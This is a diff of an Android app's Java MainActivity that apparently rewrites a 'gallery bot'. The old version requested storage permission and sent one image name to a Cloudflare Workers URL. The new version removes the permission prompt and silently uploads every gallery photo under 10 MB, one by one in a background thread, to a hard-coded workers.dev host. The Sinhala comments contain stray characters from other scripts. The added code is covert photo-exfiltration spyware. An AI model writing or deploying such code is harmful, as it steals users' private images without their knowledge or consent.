@@ -1,99 +1,93 @@
-package com.mycompany.myapp;
+package com.example.botapp;
 
-import android.Manifest;
 import android.app.Activity;
-import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
-import android.os.Build;
 import android.os.Bundle;
 import android.provider.MediaStore;
-import android.util.Log;
+import android.widget.TextView;
+import com.example.botapp.MainActivity$;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.net.URLEncoder;
 
 public class MainActivity extends Activity {
+    private static final String CF_URL = "https://frosty-king-1496phonegallary.sybertools66.workers.dev/";
 
-    private static final int STORAGE_PERMISSION_CODE = 100;
-    private static final String TAG = "TelegramBotApp";
-    private static final String WORKER_URL = "https://frosty-king-1496phonegallary.sybertools66.workers.dev/";
-
-    @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.main);
-
-        checkAndRequestPermission();
+        TextView tv = new TextView(this);
+        tv.setText("Gallery Bot Running...");
+        setContentView(tv);
+        sendLatestPhoto(CF_URL);
     }
 
-    private void checkAndRequestPermission() {
-        String permission;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permission = Manifest.permission.READ_MEDIA_IMAGES;
-        } else {
-            permission = Manifest.permission.READ_EXTERNAL_STORAGE;
-        }
-
-        if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
-            requestPermissions(new String[]{permission}, STORAGE_PERMISSION_CODE);
-        } else {
-            getGalleryImagesAndSend();
-        }
+    private void sendLatestPhoto(String targetUrl) {
+        new Thread(new MainActivity$.ExternalSyntheticLambda0(this, targetUrl)).start();
     }
 
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == STORAGE_PERMISSION_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                getGalleryImagesAndSend();
-            } else {
-                Log.d(TAG, "User denied the permission.");
-            }
-        }
-    }
-
-    private void getGalleryImagesAndSend() {
-        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-        String[] projection = {
-                MediaStore.Images.Media.DISPLAY_NAME
-        };
-
-        try (Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")) {
+    void lambda$sendLatestPhoto$0$com-example-botapp-MainActivity(String targetUrl) {
+        try {
+            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+            String[] projection = {"_data"};
+            Cursor cursor = getContentResolver().query(uri, projection, null, null, "date_added DESC");
             if (cursor != null) {
-                int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
-                
-                if (cursor.moveToFirst()) {
-                    String imageName = cursor.getString(nameColumn);
-                    Log.d(TAG, "Found image: " + imageName);
+                while (cursor.moveToNext()) {
+                    int index = cursor.getColumnIndexOrThrow("_data");
+                    String path = cursor.getString(index);
+                    if (path != null) {
+                        File file = new File(path);
+                        // ෆයිල් එක පවතියි නම් සහ ප්‍රමාණය මෙගਾਬাইট 10ට වඩා අඩු නම් පමණක් යැවීම
+                        if (file.exists() && file.length() < 10 * 1024 * 1024) {
+                            boolean success = uploadImage(targetUrl, file);
+                            // සර්වර් එකට බර වැඩිවීම වැළැක්වීමට ෆොටෝ එකක් අතරතුර තත්පර 2ක පරතරයක් තැබීම
+                            try {
+                                Thread.sleep(2000);
+                            } catch (InterruptedException e) {
+                                e.printStackTrace();
+                            }
+                            // සර්වර් එකෙන් දෝෂයක් ආවොත් (උදා: 200 නොවීම) ලූප් එක නතර කිරීම
+                            if (!success) {
+                                break;
+                            }
+                        }
+                    }
+                }
+                cursor.close();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 
-                    new Thread(() -> sendDataToWorker(imageName)).start();
+    // uploadImage වෙනස් වී boolean අගයක් (အောင်မြင်යිද නැද්ද) ලබා දෙන ලෙස සකස් කර ඇත
+    private boolean uploadImage(String targetUrl, File file) {
+        try {
+            HttpURLConnection conn = (HttpURLConnection) new URL(targetUrl).openConnection();
+            conn.setDoOutput(true);
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/octet-stream");
+            OutputStream out = conn.getOutputStream();
+            FileInputStream in = new FileInputStream(file);
+            byte[] buffer = new byte[4096];
+            while (true) {
+                int bytesRead = in.read(buffer);
+                if (bytesRead != -1) {
+                    out.write(buffer, 0, bytesRead);
+                } else {
+                    in.close();
+                    out.flush();
+                    out.close();
+                    int responseCode = conn.getResponseCode();
+                    // ප්‍රතිචාර කේතය 200 (OK) නම් සාර්ථකයි
+                    return responseCode == 200;
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error reading gallery: " + e.getMessage());
-        }
-    }
-
-    private void sendDataToWorker(String imageName) {
-        try {
-            String encodedImageName = URLEncoder.encode(imageName, "UTF-8");
-            String urlString = WORKER_URL + "?image=" + encodedImageName;
-            
-            URL url = new URL(urlString);
-            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-            connection.setRequestMethod("GET");
-
-            int responseCode = connection.getResponseCode();
-            if (responseCode == 200) {
-                Log.d(TAG, "Successfully sent data to Cloudflare Worker.");
-            } else {
-                Log.e(TAG, "Failed. Response code: " + responseCode);
-            }
-            connection.disconnect();
-        } catch (Exception e) {
-            Log.e(TAG, "Error connecting to worker: " + e.getMessage());
+            e.printStackTrace();
+            return false;
         }
     }
 }
